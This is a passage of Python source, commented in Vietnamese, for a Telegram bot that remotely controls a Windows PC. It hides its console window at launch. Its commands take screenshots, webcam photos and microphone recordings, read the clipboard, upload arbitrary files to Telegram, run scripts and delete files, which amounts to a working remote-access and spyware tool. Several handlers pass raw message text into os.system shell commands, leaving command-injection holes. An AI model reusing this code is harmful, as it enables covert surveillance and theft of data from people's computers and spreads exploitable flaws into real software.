import os
import subprocess
import psutil
import time
import requests
import cv2
import numpy as np
import pyperclip
import pyaudio
import wave
import pyautogui
import socket
from telegram import Update, ReplyKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
import mss
import shutil
import speedtest
import threading
import ctypes

# Ẩn cửa sổ console trên Windows
if os.name == 'nt':
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# Đọc token và chat_id từ file token.txt
with open('token.txt', 'r') as file:
    lines = file.read().strip().splitlines()
    TOKEN = lines[0]  # Dòng đầu là token
    ALLOWED_CHAT_ID = lines[1]  # Dòng thứ hai là chat_id

# Menu chính
main_menu = [
    ["📸 Chụp ảnh/Video", "🔊 Âm lượng", "🔋 Quản lý nguồn"],
    ["💻 Quản lý hệ thống", "🌐 Công cụ mạng", "🛠️ Tiện ích khác"],
    ["📎 Gửi clipboard", "📤 Gửi file", "📂 Quản lý tệp"],
    ["🤖 Tự động hóa", "🖱️ Menu chuột"],
    ["🎵 Điều khiển media"],
    ["🔙 Thoát"]
]

# Các submenu
capture_menu = [["📸 Chụp màn hình", "📷 Chụp webcam"], ["🎙️ Ghi âm", "📸 Quay màn hình"], ["🔙 Quay lại"]]
volume_menu = [["🔊 Tăng âm lượng", "🔉 Giảm âm lượng"], ["🔊 Tắt tiếng", "🔈 Bật tiếng"], ["🔙 Quay lại"]]
power_menu = [["💤 Sleep", "🔴 Tắt máy"], ["🔄 Khởi động lại", "🔒 Khóa màn hình"], ["🌑 Tắt màn hình", "🔙 Quay lại"]]
system_menu = [["📊 Trạng thái hệ thống", "📋 Danh sách tiến trình"], ["🔧 Tắt chương trình"], ["🔙 Quay lại"]]
network_menu = [
    ["🌍 Xem IP Public", "📡 Ping"],
    ["🔍 Tìm kiếm web", "📶 Kiểm tra trạng thái Wi-Fi"],
    ["🚀 Kiểm tra tốc độ", "🔧 Cấu hình IP"],
    ["📥 Download File", "🔌 Check Port"],
    ["🔙 Quay lại"]
]
utility_menu = [
    ["📂 Mở File Explorer", "🌐 Mở trình duyệt", "🖥️ Mở CMD"],
    ["🖥️ Mở UltraViewer", "📡 Mở TeamViewer", "📝 Mở Notepad"],
    ["🧮 Mở Calculator", "📋 Mở Task Manager", "⚙️ Mở Control Panel"],
    ["🎨 Mở Paint", "⚙️ Mở Cài đặt"],
    ["💾 Dung lượng ổ đĩa", "🔊 Phát âm thanh"],
    ["📢 Gửi thông báo"],
    ["🔙 Quay lại"]
]
file_menu = [["📁 Tạo thư mục", "📋 Liệt kê file"], ["🗑️ Xóa file"], ["🔙 Quay lại"]]
automation_menu = [
    ["⌨️ Gõ phím tự động", "⏎ Nhấn Enter"],
    ["⏰ Lên lịch tắt máy", "📜 Chạy script"],
    ["🔙 Quay lại"]
]
mouse_menu = [
    ["⬆️ Cuộn lên", "⬇️ Cuộn xuống"],
    ["🖱️ Nhấn chuột trái", "🖱️ Nhấn chuột phải"],
    ["✌️ Double Click"],
    ["🔙 Quay lại"]
]
media_menu = [
    ["▶️ Play", "⏸️ Pause"],
    ["⏮️ Previous", "⏭️ Next"],
    ["⏹️ Stop"],
    ["🔙 Quay lại"]
]

# Tạo ReplyKeyboardMarkup
main_reply_markup = ReplyKeyboardMarkup(main_menu, resize_keyboard=True)
capture_reply_markup = ReplyKeyboardMarkup(capture_menu, resize_keyboard=True)
volume_reply_markup = ReplyKeyboardMarkup(volume_menu, resize_keyboard=True)
power_reply_markup = ReplyKeyboardMarkup(power_menu, resize_keyboard=True)
system_reply_markup = ReplyKeyboardMarkup(system_menu, resize_keyboard=True)
network_reply_markup = ReplyKeyboardMarkup(network_menu, resize_keyboard=True)
utility_reply_markup = ReplyKeyboardMarkup(utility_menu, resize_keyboard=True)
file_reply_markup = ReplyKeyboardMarkup(file_menu, resize_keyboard=True)
automation_reply_markup = ReplyKeyboardMarkup(automation_menu, resize_keyboard=True)
mouse_reply_markup = ReplyKeyboardMarkup(mouse_menu, resize_keyboard=True)
media_reply_markup = ReplyKeyboardMarkup(media_menu, resize_keyboard=True)

# Hàm kiểm tra chat_id
def check_chat_id(chat_id):
    return str(chat_id) == ALLOWED_CHAT_ID

# Hàm khởi động bot
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.message.chat_id
    if not check_chat_id(chat_id):
        await update.message.reply_text("❌ Bạn không có quyền truy cập bot này!")
        return
    user = update.message.from_user
    # Lấy tên hoặc username
    user_name = user.first_name or "Người dùng"  # Dùng first_name, nếu không có thì mặc định là "Người dùng"
    if user.username:
        user_name = f"@{user.username}"  # Ưu tiên username nếu có
    context.user_data.clear()  # Xóa trạng thái khi bắt đầu
    await update.message.reply_text(
        f"✨ Hello bro {user_name}! Sử dụng menu dưới đây để điều khiển máy tính từ xa.",
        reply_markup=main_reply_markup
    )

# Hàm đo CPU chính xác hơn
def get_cpu_usage():
    cpu_samples = []
    for _ in range(3):
        cpu_samples.append(psutil.cpu_percent(interval=1, percpu=False))
    avg_cpu = sum(cpu_samples) / len(cpu_samples)
    per_core = psutil.cpu_percent(interval=1, percpu=True)
    core_details = "\n".join([f"Core {i}: {usage:.2f}%" for i, usage in enumerate(per_core)])
    return avg_cpu, core_details

# Hàm ghi màn hình tối ưu
def record_screen(frames, output_file="screen_record.mp4", fps=5.0):
    with mss.mss() as sct:
        monitor = sct.monitors[1]  # Monitor chính
        screen_width = monitor["width"]
        screen_height = monitor["height"]

    fourcc = cv2.VideoWriter_fourcc(*"mp4v")
    out = cv2.VideoWriter(output_file, fourcc, fps, (screen_width, screen_height), isColor=True)
    frame_count = 0

    with mss.mss() as sct:
        for _ in range(frames):
            img = sct.grab(monitor)
            frame = np.array(img)
            frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
            out.write(frame)
            frame_count += 1

    out.release()
    if shutil.which("ffmpeg"):
        temp_file = "temp_screen_record.mp4"
        os.system(f"ffmpeg -i {output_file} -vcodec libx264 -crf 28 -preset fast {temp_file} -y")
        os.remove(output_file)
        os.rename(temp_file, output_file)
    return frame_count

# Hàm kiểm tra trạng thái Wi-Fi
def get_wifi_status():
    result = subprocess.run("netsh wlan show interfaces", capture_output=True, text=True, shell=True)
    output = result.stdout
    if "There is no wireless interface" in output:
        return "❌ Không tìm thấy adapter Wi-Fi trên máy!"
    
    status = ""
    if "State" in output:
        state_line = [line for line in output.splitlines() if "State" in line][0]
        state = state_line.split(":")[1].strip()
        status += f"🔵 Trạng thái: {state}\n"
    
    if "SSID" in output and "not connected" not in state:
        ssid_line = [line for line in output.splitlines() if "SSID" in line][0]
        ssid = ssid_line.split(":")[1].strip()
        status += f"🌐 Tên mạng: {ssid}\n"
    
    if "Signal" in output and "not connected" not in state:
        signal_line = [line for line in output.splitlines() if "Signal" in line][0]
        signal = signal_line.split(":")[1].strip()
        status += f"📶 Cường độ tín hiệu: {signal}"
    
    return status if status else "ℹ️ Không có thông tin Wi-Fi khả dụng!"

# Hàm xử lý tin nhắn từ người dùng
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.message.chat_id
    if not check_chat_id(chat_id):
        await update.message.reply_text("❌ Bạn không có quyền truy cập bot này!")
        return

    msg = update.message.text

    # Chuyển đổi menu cấp cao
    if msg == "📸 Chụp ảnh/Video":
        context.user_data.clear()
        await update.message.reply_text("📷 Chọn chức năng chụp ảnh/video:", reply_markup=capture_reply_markup)
    elif msg == "🔊 Âm lượng":
        context.user_data.clear()
        await update.message.reply_text("🎚️ Chọn chức năng điều chỉnh âm lượng:", reply_markup=volume_reply_markup)
    elif msg == "🔋 Quản lý nguồn":
        context.user_data.clear()
        await update.message.reply_text("🔌 Chọn chức năng quản lý nguồn:", reply_markup=power_reply_markup)
    elif msg == "💻 Quản lý hệ thống":
        context.user_data.clear()
        await update.message.reply_text("🖥️ Chọn chức năng quản lý hệ thống:", reply_markup=system_reply_markup)
    elif msg == "🌐 Công cụ mạng":
        context.user_data.clear()
        await update.message.reply_text("🌍 Chọn công cụ mạng:", reply_markup=network_reply_markup)
    elif msg == "🛠️ Tiện ích khác":
        context.user_data.clear()
        await update.message.reply_text("🔧 Chọn tiện ích hữu ích:", reply_markup=utility_reply_markup)
    elif msg == "📂 Quản lý tệp":
        context.user_data.clear()
        await update.message.reply_text("📁 Chọn chức năng quản lý tệp:", reply_markup=file_reply_markup)
    elif msg == "🤖 Tự động hóa":
        context.user_data.clear()
        await update.message.reply_text("⚙️ Chọn chức năng tự động hóa:", reply_markup=automation_reply_markup)
    elif msg == "🖱️ Menu chuột":
        context.user_data.clear()
        await update.message.reply_text("🖱️ Chọn thao tác chuột:", reply_markup=mouse_reply_markup)
    elif msg == "🎵 Điều khiển media":
        context.user_data.clear()
        await update.message.reply_text("🎶 Chọn chức năng điều khiển media:", reply_markup=media_reply_markup)
    elif msg == "🔙 Quay lại":
        context.user_data.clear()
        await update.message.reply_text("✅ Đã quay lại menu chính!", reply_markup=main_reply_markup)

    # Xử lý submenu "Chụp ảnh/Video"
    elif msg == "📸 Chụp màn hình":
        context.user_data.clear()
        with mss.mss() as sct:
            screenshot = sct.shot(output="screenshot.png")
        img = cv2.imread("screenshot.png")
        cv2.imwrite("screenshot_optimized.jpg", img, [int(cv2.IMWRITE_JPEG_QUALITY), 100])
        with open("screenshot_optimized.jpg", "rb") as photo:
            await context.bot.send_photo(chat_id=chat_id, photo=photo)
        os.remove("screenshot.png")
        os.remove("screenshot_optimized.jpg")
        await update.message.reply_text("✅ Đã chụp và gửi ảnh màn hình thành công!")
    elif msg == "📷 Chụp webcam":
        context.user_data.clear()
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            await update.message.reply_text("❌ Không thể mở webcam, kiểm tra thiết bị nhé!")
        else:
            ret, frame = cap.read()
            if ret:
                cv2.imwrite("webcam_shot.jpg", frame, [int(cv2.IMWRITE_JPEG_QUALITY), 100])
                with open("webcam_shot.jpg", "rb") as photo:
                    await context.bot.send_photo(chat_id=chat_id, photo=photo)
                os.remove("webcam_shot.jpg")
                await update.message.reply_text("✅ Đã chụp ảnh từ webcam và gửi thành công!")
            else:
                await update.message.reply_text("❌ Lỗi khi chụp từ webcam, thử lại nhé!")
            cap.release()
    elif msg == "🎙️ Ghi âm":
        context.user_data.clear()
        await update.message.reply_text("⏱️ Nhập số giây muốn ghi âm (ví dụ: '10'):")
        context.user_data["waiting_for_record"] = True
    elif msg == "📸 Quay màn hình":
        context.user_data.clear()
        await update.message.reply_text("🎥 Nhập số khung hình để quay (ví dụ: '50' cho ~10 giây):")
        context.user_data["waiting_for_screen_record"] = True

    # Xử lý submenu "Âm lượng"
    elif msg == "🔊 Tăng âm lượng":
        context.user_data.clear()
        subprocess.run(["nircmd.exe", "changesysvolume", "5000"])
        await update.message.reply_text("✅ Âm lượng đã được tăng!")
    elif msg == "🔉 Giảm âm lượng":
        context.user_data.clear()
        subprocess.run(["nircmd.exe", "changesysvolume", "-5000"])
        await update.message.reply_text("✅ Âm lượng đã được giảm!")
    elif msg == "🔊 Tắt tiếng":
        context.user_data.clear()
        subprocess.run(["nircmd.exe", "mutesysvolume", "1"])
        await update.message.reply_text("✅ Đã tắt tiếng hệ thống!")
    elif msg == "🔈 Bật tiếng":
        context.user_data.clear()
        subprocess.run(["nircmd.exe", "mutesysvolume", "0"])
        await update.message.reply_text("✅ Đã bật lại tiếng hệ thống!")

    # Xử lý submenu "Quản lý nguồn"
    elif msg == "💤 Sleep":
        context.user_data.clear()
        os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")
        await update.message.reply_text("✅ Máy tính đã chuyển sang chế độ ngủ!")
    elif msg == "🔴 Tắt máy":
        context.user_data.clear()
        os.system("shutdown /s /t 1")
        await update.message.reply_text("✅ Máy tính sẽ tắt trong 1 giây!")
    elif msg == "🔄 Khởi động lại":
        context.user_data.clear()
        os.system("shutdown /r /t 1")
        await update.message.reply_text("✅ Máy tính sẽ khởi động lại trong 1 giây!")
    elif msg == "🔒 Khóa màn hình":
        context.user_data.clear()
        os.system("rundll32.exe user32.dll,LockWorkStation")
        await update.message.reply_text("✅ Màn hình đã được khóa thành công!")
    elif msg == "🌑 Tắt màn hình":
        context.user_data.clear()
        os.system("powershell (Add-Type '[DllImport(\\\"user32.dll\\\")]public static extern int SendMessage(int hWnd,int hMsg,int wParam,int lParam);' -Name a -Pas)::SendMessage(-1,0x0112,0xF170,2)")
        await update.message.reply_text("✅ Màn hình đã tắt, nhấn phím bất kỳ để bật lại!")

    # Xử lý submenu "Quản lý hệ thống"
    elif msg == "📊 Trạng thái hệ thống":
        context.user_data.clear()
        avg_cpu, core_details = get_cpu_usage()
        memory = psutil.virtual_memory()
        battery = psutil.sensors_battery()
        status = f"💻 CPU trung bình: {avg_cpu:.2f}%\n📈 Chi tiết từng lõi:\n{core_details}\n🧠 RAM: {memory.percent}% ({memory.used / 1024**3:.2f}/{memory.total / 1024**3:.2f} GB)"
        if battery:
            status += f"\n🔋 Pin: {battery.percent}% (Đang sạc: {'Có' if battery.power_plugged else 'Không'})"
        await update.message.reply_text(f"✅ Trạng thái hệ thống:\n{status}")
    elif msg == "📋 Danh sách tiến trình":
        context.user_data.clear()
        system_processes = {"svchost.exe", "csrss.exe", "winlogon.exe", "lsass.exe", "smss.exe", "dwm.exe", "conhost.exe"}
        processes = []
        for p in psutil.process_iter(attrs=['pid', 'name', 'exe']):
            try:
                name = p.info['name'].lower()
                if name not in system_processes and p.info['exe'] and "system32" not in p.info['exe'].lower():
                    processes.append(f"{p.info['name']} (PID: {p.info['pid']})")
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
        process_list = "\n".join(processes[:10])
        if process_list:
            await update.message.reply_text(f"✅ Danh sách 10 tiến trình đang chạy:\n{process_list}")
        else:
            await update.message.reply_text("ℹ️ Hiện không có tiến trình người dùng nào đang chạy!")
    elif msg == "🔧 Tắt chương trình":
        context.user_data.clear()
        await update.message.reply_text("⚠️ Nhập tên tiến trình muốn tắt (ví dụ: 'notepad.exe'):")
        context.user_data["waiting_for_kill"] = True

    # Xử lý submenu "Công cụ mạng"
    elif msg == "🌍 Xem IP Public":
        context.user_data.clear()
        try:
            ip = requests.get("https://api.ipify.org").text
            await update.message.reply_text(f"✅ Địa chỉ IP Public: {ip}")
        except Exception as e:
            await update.message.reply_text(f"❌ Lỗi khi lấy IP: {str(e)}")
    elif msg == "📡 Ping":
        context.user_data.clear()
        await update.message.reply_text("🌐 Nhập URL để ping (ví dụ: 'google.com'):")
        context.user_data["waiting_for_ping"] = True
    elif msg == "🔍 Tìm kiếm web":
        context.user_data.clear()
        await update.message.reply_text("🔎 Nhập từ khóa để tìm kiếm trên Google (ví dụ: 'Python tutorial'):")
        context.user_data["waiting_for_search"] = True
    elif msg == "📶 Kiểm tra trạng thái Wi-Fi":
        context.user_data.clear()
        wifi_status = get_wifi_status()
        await update.message.reply_text(f"✅ Trạng thái Wi-Fi:\n{wifi_status}")
    elif msg == "🚀 Kiểm tra tốc độ":
        context.user_data.clear()
        try:
            st = speedtest.Speedtest()
            st.get_best_server()
            download_speed = st.download() / 1_000_000  # Chuyển sang Mbps
            upload_speed = st.upload() / 1_000_000  # Chuyển sang Mbps
            ping = st.results.ping
            result = f"📥 Tốc độ tải xuống: {download_speed:.2f} Mbps\n📤 Tốc độ tải lên: {upload_speed:.2f} Mbps\n🏓 Ping: {ping:.2f} ms"
            await update.message.reply_text(f"✅ Kết quả kiểm tra tốc độ mạng:\n{result}")
        except Exception as e:
            await update.message.reply_text(f"❌ Lỗi khi kiểm tra tốc độ: {str(e)}")
    elif msg == "🔧 Cấu hình IP":
        context.user_data.clear()
        await update.message.reply_text("🌐 Nhập 'DHCP' để tự động hoặc 'IP [địa chỉ] [mặt nạ] [gateway]' (ví dụ: 'IP 192.168.1.100 255.255.255.0 192.168.1.1'):")
        context.user_data["waiting_for_ip_config"] = True
    elif msg == "📥 Download File":
        context.user_data.clear()
        await update.message.reply_text("⬇️ Nhập URL để tải file (ví dụ: 'https://example.com/file.zip'):")
        context.user_data["waiting_for_download"] = True
    elif msg == "🔌 Check Port":
        context.user_data.clear()
        await update.message.reply_text("🔍 Nhập IP và port để kiểm tra (ví dụ: '192.168.1.1 80'):")
        context.user_data["waiting_for_check_port"] = True

    # Xử lý submenu "Tiện ích khác"
    elif msg == "📂 Mở File Explorer":
        context.user_data.clear()
        os.system("explorer")
        await update.message.reply_text("✅ Đã mở File Explorer thành công!")
    elif msg == "🌐 Mở trình duyệt":
        context.user_data.clear()
        os.system("start chrome")
        await update.message.reply_text("✅ Đã mở trình duyệt Chrome!")
    elif msg == "🖥️ Mở CMD":
        context.user_data.clear()
        os.system("start cmd")
        await update.message.reply_text("✅ Đã mở Command Prompt!")
    elif msg == "🖥️ Mở UltraViewer":
        context.user_data.clear()
        ultraviewer_path = "C:\\Program Files (x86)\\UltraViewer\\UltraViewer_Desktop.exe"
        if os.path.exists(ultraviewer_path):
            os.startfile(ultraviewer_path)
            await update.message.reply_text("✅ Đã mở UltraViewer thành công!")
        else:
            await update.message.reply_text("❌ Không tìm thấy UltraViewer, vui lòng cài đặt trước!")
    elif msg == "📡 Mở TeamViewer":
        context.user_data.clear()
        teamviewer_path = "C:\\Program Files (x86)\\TeamViewer\\TeamViewer.exe"
        if os.path.exists(teamviewer_path):
            os.startfile(teamviewer_path)
            await update.message.reply_text("✅ Đã mở TeamViewer thành công!")
        else:
            await update.message.reply_text("❌ Không tìm thấy TeamViewer, vui lòng cài đặt trước!")
    elif msg == "📝 Mở Notepad":
        context.user_data.clear()
        os.system("start notepad")
        await update.message.reply_text("✅ Đã mở Notepad thành công!")
    elif msg == "🧮 Mở Calculator":
        context.user_data.clear()
        os.system("start calc")
        await update.message.reply_text("✅ Đã mở Calculator thành công!")
    elif msg == "📋 Mở Task Manager":
        context.user_data.clear()
        os.system("start taskmgr")
        await update.message.reply_text("✅ Đã mở Task Manager thành công!")
    elif msg == "⚙️ Mở Control Panel":
        context.user_data.clear()
        os.system("start control")
        await update.message.reply_text("✅ Đã mở Control Panel thành công!")
    elif msg == "🎨 Mở Paint":
        context.user_data.clear()
        os.system("start mspaint")
        await update.message.reply_text("✅ Đã mở Paint thành công!")
    elif msg == "⚙️ Mở Cài đặt":
        context.user_data.clear()
        os.system("start ms-settings:")
        await update.message.reply_text("✅ Đã mở Cài đặt Windows thành công!")
    elif msg == "💾 Dung lượng ổ đĩa":
        context.user_data.clear()
        disk = psutil.disk_usage("C:\\")
        await update.message.reply_text(
            f"✅ Thông tin dung lượng ổ C:\n📊 Tổng: {disk.total / 1024**3:.2f} GB\n📈 Đã dùng: {disk.used / 1024**3:.2f} GB\n📉 Còn trống: {disk.free / 1024**3:.2f} GB"
        )
    elif msg == "🔊 Phát âm thanh":
        context.user_data.clear()
        await update.message.reply_text("🎵 Nhập đường dẫn file âm thanh để phát (ví dụ: 'C:\\audio.mp3'):")
        context.user_data["waiting_for_play_sound"] = True
    elif msg == "📢 Gửi thông báo":
        context.user_data.clear()
        await update.message.reply_text("✉️ Nhập nội dung thông báo muốn hiển thị trên máy tính:")
        context.user_data["waiting_for_notification"] = True

    # Xử lý submenu "Quản lý tệp"
    elif msg == "🗑️ Xóa file":
        context.user_data.clear()
        await update.message.reply_text("⚠️ Nhập đường dẫn file muốn xóa (ví dụ: 'C:\\Users\\file.txt'):")
        context.user_data["waiting_for_delete_file"] = True
    elif msg == "📁 Tạo thư mục":
        context.user_data.clear()
        await update.message.reply_text("📂 Nhập đường dẫn thư mục muốn tạo (ví dụ: 'C:\\Users\\NewFolder'):")
        context.user_data["waiting_for_create_folder"] = True
    elif msg == "📋 Liệt kê file":
        context.user_data.clear()
        await update.message.reply_text("📜 Nhập đường dẫn thư mục để liệt kê tệp (ví dụ: 'C:\\Users'):")
        context.user_data["waiting_for_list_files"] = True

    # Xử lý submenu "Tự động hóa"
    elif msg == "⌨️ Gõ phím tự động":
        context.user_data.clear()
        await update.message.reply_text("⌨️ Nhập nội dung muốn gõ tự động (ví dụ: 'Hello World'):")
        context.user_data["waiting_for_auto_type"] = True
    elif msg == "📜 Chạy script":
        context.user_data.clear()
        await update.message.reply_text("📜 Nhập đường dẫn script muốn chạy (ví dụ: 'C:\\script.bat'):")
        context.user_data["waiting_for_run_script"] = True
    elif msg == "⏰ Lên lịch tắt máy":
        context.user_data.clear()
        await update.message.reply_text("⏱️ Nhập số giây để lên lịch tắt máy (ví dụ: '3600' cho 1 giờ):")
        context.user_data["waiting_for_shutdown_schedule"] = True
    elif msg == "⏎ Nhấn Enter":
        context.user_data.clear()
        pyautogui.press("enter")
        await update.message.reply_text("✅ Đã nhấn phím Enter thành công!")

    # Xử lý submenu "Menu chuột"
    elif msg == "⬆️ Cuộn lên":
        context.user_data.clear()
        pyautogui.scroll(100)
        await update.message.reply_text("✅ Đã cuộn chuột lên!")
    elif msg == "⬇️ Cuộn xuống":
        context.user_data.clear()
        pyautogui.scroll(-100)
        await update.message.reply_text("✅ Đã cuộn chuột xuống!")
    elif msg == "🖱️ Nhấn chuột trái":
        context.user_data.clear()
        pyautogui.click(button='left')
        await update.message.reply_text("✅ Đã nhấn chuột trái một lần!")
    elif msg == "🖱️ Nhấn chuột phải":
        context.user_data.clear()
        pyautogui.click(button='right')
        await update.message.reply_text("✅ Đã nhấn chuột phải một lần!")
    elif msg == "✌️ Double Click":
        context.user_data.clear()
        pyautogui.doubleClick()
        await update.message.reply_text("✅ Đã nhấn đúp chuột trái thành công!")

    # Xử lý submenu "Điều khiển media"
    elif msg == "▶️ Play":
        context.user_data.clear()
        pyautogui.press("playpause")
        await update.message.reply_text("✅ Đã nhấn Play (bật nhạc/video)!")
    elif msg == "⏸️ Pause":
        context.user_data.clear()
        pyautogui.press("playpause")
        await update.message.reply_text("✅ Đã nhấn Pause (tạm dừng nhạc/video)!")
    elif msg == "⏹️ Stop":
        context.user_data.clear()
        pyautogui.press("stop")
        await update.message.reply_text("✅ Đã nhấn Stop (dừng nhạc/video)!")
    elif msg == "⏭️ Next":
        context.user_data.clear()
        pyautogui.press("nexttrack")
        await update.message.reply_text("✅ Đã chuyển sang bài tiếp theo!")
    elif msg == "⏮️ Previous":
        context.user_data.clear()
        pyautogui.press("prevtrack")
        await update.message.reply_text("✅ Đã quay lại bài trước đó!")

    # Xử lý các lệnh khác
    elif msg == "📎 Gửi clipboard":
        context.user_data.clear()
        try:
            clipboard_content = pyperclip.paste()
            if clipboard_content:
                await update.message.reply_text(f"✅ Nội dung clipboard: {clipboard_content}")
            else:
                await update.message.reply_text("ℹ️ Clipboard hiện đang trống!")
        except Exception as e:
            await update.message.reply_text(f"❌ Lỗi khi lấy clipboard: {str(e)}")
    elif msg == "📤 Gửi file":
        context.user_data.clear()
        await update.message.reply_text("📄 Nhập đường dẫn file muốn gửi (ví dụ: 'C:\\Users\\file.txt'):")
        context.user_data["waiting_for_file"] = True
    elif msg == "🔙 Thoát":
        context.user_data.clear()
        await update.message.reply_text("👋 Tạm biệt bạn, hẹn gặp lại!", reply_markup=ReplyKeyboardMarkup([], resize_keyboard=True))

    # Xử lý các lệnh chờ input
    elif context.user_data.get("waiting_for_record"):
        try:
            seconds = int(msg)
            CHUNK = 1024
            FORMAT = pyaudio.paInt16
            CHANNELS = 1
            RATE = 44100
            p = pyaudio.PyAudio()
            stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
            frames = []
            for _ in range(0, int(RATE / CHUNK * seconds)):
                data = stream.read(CHUNK)
                frames.append(data)
            stream.stop_stream()
            stream.close()
            p.terminate()
            wf = wave.open("recording.wav", "wb")
            wf.setnchannels(CHANNELS)
            wf.setsampwidth(p.get_sample_size(FORMAT))
            wf.setframerate(RATE)
            wf.writeframes(b''.join(frames))
            wf.close()
            with open("recording.wav", "rb") as audio:
                await context.bot.send_audio(chat_id=chat_id, audio=audio)
            os.remove("recording.wav")
            await update.message.reply_text(f"✅ Đã ghi âm {seconds} giây và gửi file thành công!")
        except ValueError:
            await update.message.reply_text("❌ Vui lòng nhập số giây hợp lệ (ví dụ: '10')!")
        context.user_data["waiting_for_record"] = False
    elif context.user_data.get("waiting_for_kill"):
        try:
            for proc in psutil.process_iter():
                if proc.name().lower() == msg.lower():
                    proc.kill()
                    await update.message.reply_text(f"✅ Đã tắt tiến trình '{msg}' thành công!")
                    break
            else:
                await update.message.reply_text(f"❌ Không tìm thấy tiến trình '{msg}'!")
        except Exception as e:
            await update.message.reply_text(f"❌ Lỗi khi tắt tiến trình: {str(e)}")
        context.user_data["waiting_for_kill"] = False
    elif context.user_data.get("waiting_for_ping"):
        result = subprocess.run(["ping", msg, "-n", "4"], capture_output=True, text=True)
        await update.message.reply_text(f"✅ Kết quả ping '{msg}':\n{result.stdout}")
        context.user_data["waiting_for_ping"] = False
    elif context.user_data.get("waiting_for_search"):
        os.system(f"start chrome https://www.google.com/search?q={msg.replace(' ', '+')}")
        await update.message.reply_text(f"✅ Đã mở trình duyệt và tìm kiếm '{msg}' trên Google!")
        context.user_data["waiting_for_search"] = False
    elif context.user_data.get("waiting_for_ip_config"):
        if msg.upper() == "DHCP":
            os.system("netsh interface ip set address \"Wi-Fi\" dhcp")
            await update.message.reply_text("✅ Đã cấu hình IP tự động (DHCP) thành công!")
        else:
            try:
                parts = msg.split()
                if len(parts) == 4 and parts[0].upper() == "IP":
                    ip, mask, gateway = parts[1], parts[2], parts[3]
                    os.system(f"netsh interface ip set address \"Wi-Fi\" static {ip} {mask} {gateway}")
                    await update.message.reply_text(f"✅ Đã đặt IP tĩnh: {ip} thành công!")
                else:
                    await update.message.reply_text("❌ Định dạng sai, ví dụ: 'IP 192.168.1.100 255.255.255.0 192.168.1.1'")
            except Exception as e:
                await update.message.reply_text(f"❌ Lỗi khi cấu hình IP: {str(e)}")
        context.user_data["waiting_for_ip_config"] = False
    elif context.user_data.get("waiting_for_delete_file"):
        try:
            if os.path.exists(msg):
                os.remove(msg)
                await update.message.reply_text(f"✅ Đã xóa file '{msg}' thành công!")
            else:
                await update.message.reply_text(f"❌ File '{msg}' không tồn tại!")
        except Exception as e:
            await update.message.reply_text(f"❌ Lỗi khi xóa file: {str(e)}")
        context.user_data["waiting_for_delete_file"] = False
    elif context.user_data.get("waiting_for_create_folder"):
        try:
            os.makedirs(msg, exist_ok=True)
            await update.message.reply_text(f"✅ Đã tạo thư mục '{msg}' thành công!")
        except Exception as e:
            await update.message.reply_text(f"❌ Lỗi khi tạo thư mục: {str(e)}")
        context.user_data["waiting_for_create_folder"] = False
    elif context.user_data.get("waiting_for_list_files"):
        try:
            if os.path.isdir(msg):
                all_items = os.listdir(msg)
                file_list = []
                for item in all_items:
                    full_path = os.path.join(msg, item)
                    if os.path.isdir(full_path):
                        file_list.append(f"📁 {item} (Thư mục)")
                    else:
                        file_list.append(f"📄 {item}")
                if file_list:
                    output = "\n".join(file_list)
                    if len(output) > 4000:
                        for i in range(0, len(file_list), 50):
                            chunk = "\n".join(file_list[i:i + 50])
                            await update.message.reply_text(f"✅ Danh sách tệp trong '{msg}' (phần {i // 50 + 1}):\n{chunk}")
                    else:
                        await update.message.reply_text(f"✅ Danh sách tệp trong '{msg}':\n{output}")
                else:
                    await update.message.reply_text(f"ℹ️ Thư mục '{msg}' hiện đang trống!")
            else:
                await update.message.reply_text(f"❌ '{msg}' không phải thư mục hoặc không tồn tại!")
        except Exception as e:
            await update.message.reply_text(f"❌ Lỗi khi liệt kê tệp: {str(e)}")
        context.user_data["waiting_for_list_files"] = False
    elif context.user_data.get("waiting_for_auto_type"):
        time.sleep(2)
        pyautogui.typewrite(msg)
        await update.message.reply_text(f"✅ Đã gõ tự động nội dung: '{msg}'!")
        context.user_data["waiting_for_auto_type"] = False
    elif context.user_data.get("waiting_for_run_script"):
        try:
            if os.path.exists(msg):
                subprocess.run(msg, shell=True)
                await update.message.reply_text(f"✅ Đã chạy script '{msg}' thành công!")
            else:
                await update.message.reply_text(f"❌ Script '{msg}' không tồn tại!")
        except Exception as e:
            await update.message.reply_text(f"❌ Lỗi khi chạy script: {str(e)}")
        context.user_data["waiting_for_run_script"] = False
    elif context.user_data.get("waiting_for_shutdown_schedule"):
        try:
            seconds = int(msg)
            os.system(f"shutdown /s /t {seconds}")
            await update.message.reply_text(f"✅ Đã lên lịch tắt máy sau {seconds} giây!")
        except ValueError:
            await update.message.reply_text("❌ Vui lòng nhập số giây hợp lệ (ví dụ: '3600')!")
        context.user_data["waiting_for_shutdown_schedule"] = False
    elif context.user_data.get("waiting_for_file"):
        try:
            if os.path.exists(msg):
                with open(msg, "rb") as file:
                    await context.bot.send_document(chat_id=chat_id, document=file)
                await update.message.reply_text(f"✅ Đã gửi file '{msg}' thành công!")
            else:
                await update.message.reply_text(f"❌ File '{msg}' không tồn tại!")
        except Exception as e:
            await update.message.reply_text(f"❌ Lỗi khi gửi file: {str(e)}")
        context.user_data["waiting_for_file"] = False
    elif context.user_data.get("waiting_for_screen_record"):
        try:
            frames = int(msg)
            if frames < 1:
                await update.message.reply_text("❌ Số khung hình phải lớn hơn 0!")
                context.user_data["waiting_for_screen_record"] = False
                return
            await update.message.reply_text("🎥 Đang quay màn hình, vui lòng đợi...")
            output_file = "screen_record.mp4"
            fps = 5.0
            record_thread = threading.Thread(target=record_screen, args=(frames, output_file, fps))
            record_thread.start()
            record_thread.join()
            if not os.path.exists(output_file) or os.path.getsize(output_file) == 0:
                await update.message.reply_text("❌ Không thể quay video, thử lại sau!")
                if os.path.exists(output_file):
                    os.remove(output_file)
            else:
                with open(output_file, "rb") as video:
                    await context.bot.send_video(chat_id=chat_id, video=video)
                os.remove(output_file)
                expected_time = frames / fps
